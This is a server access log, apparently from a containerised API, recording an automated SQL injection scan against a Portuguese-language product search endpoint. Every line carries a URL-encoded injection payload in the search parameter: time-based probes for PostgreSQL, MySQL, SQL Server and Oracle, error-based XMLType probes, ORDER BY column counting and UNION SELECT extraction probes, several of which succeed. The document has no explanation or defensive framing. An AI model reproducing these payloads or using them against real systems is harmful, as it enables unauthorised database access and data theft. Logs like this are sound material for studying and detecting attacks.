api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:50916 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7507%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287507%3D7507%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FYhoC&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50908 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288962%3D8962%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%29&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50922 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50938 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50944 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50952 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50958 - "GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50962 - "GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50974 - "GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50976 - "GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50978 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50980 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50984 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50990 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2881%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50994 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6259%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Yzqs%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27hyna%27%3D%27hyna&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:50998 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6259%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Yzqs%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ySVT%27%3D%27ySVT&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51000 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6259%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Yzqs%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283380%3D3380&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50996 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6259%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Yzqs%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51010 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6259%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Yzqs%29--%2F%2A%2A%2FXnMb&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51026 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5711%3D%28SELECT%2F%2A%2A%2F5711%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Mumw%27%3D%27Mumw&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51028 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5711%3D%28SELECT%2F%2A%2A%2F5711%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Odsm%27%3D%27Odsm&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51042 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5711%3D%28SELECT%2F%2A%2A%2F5711%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282350%3D2350&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51050 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5711%3D%28SELECT%2F%2A%2A%2F5711%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51058 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5711%3D%28SELECT%2F%2A%2A%2F5711%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2Fboaw&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51066 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27HGoc%27%3D%27HGoc&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51072 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27FUJf%27%3D%27FUJf&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51076 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%285591%3D5591&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51086 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51102 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FzKpo&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51106 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1981%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%2899%29%7C%7CCHR%2882%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27BKDK%27%3D%27BKDK&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51096 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1981%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%2899%29%7C%7CCHR%2882%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZqrR%27%3D%27ZqrR&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51120 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1981%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%2899%29%7C%7CCHR%2882%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286752%3D6752&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51136 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1981%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%2899%29%7C%7CCHR%2882%29%2C5%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51150 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1981%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%2899%29%7C%7CCHR%2882%29%2C5%29--%2F%2A%2A%2FkPuY&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51158 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FQpIC&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51174 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FITOU&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51184 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7171--%2F%2A%2A%2FdnCL&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51186 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F10--%2F%2A%2A%2FVWqK&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51200 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6--%2F%2A%2A%2FLXrp&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:51210 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4--%2F%2A%2A%2FqQTn&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51220 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5--%2F%2A%2A%2FOUZU&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51202 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%27VQmYlTBzFcSpwecBoBTkOBLxACnyzRGJwiXWdJYh%27%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FnqsQ&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51224 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%27VQmYlTBzFcSpwecBoBTkOBLxACnyzRGJwiXWdJYh%27%29%2C%27qjxjq%27%29%2CNULL%2CNULL%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%27lGJXtPfJslIhObiJVhmYPqvLGzRaeTKeyvqGaiQW%27%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FBRqb&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51228 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%27VQmYlTBzFcSpwecBoBTkOBLxACnyzRGJwiXWdJYh%27%29%2C%27qjxjq%27%29%2CNULL%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F0%2F%2A%2A%2FAS%2F%2A%2A%2FrTJg%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F10%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F11%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F12%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F13%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F14%29%2F%2A%2A%2FAS%2F%2A%2A%2FwoNp--%2F%2A%2A%2FyhpV&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51242 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2855%3D55%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FXSYj&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51246 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2855%3D78%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FOhEx&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51256 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2855%3D88%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FcOQr&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51262 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2888%3D78%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FjTUr&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51264 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2878%3D78%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FTecN&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51284 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qvxvq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2888%2F%2A%2A%2F78%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjxjq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FaFUF&categoria=eletronicos HTTP/1.1" 500 Internal Server Error
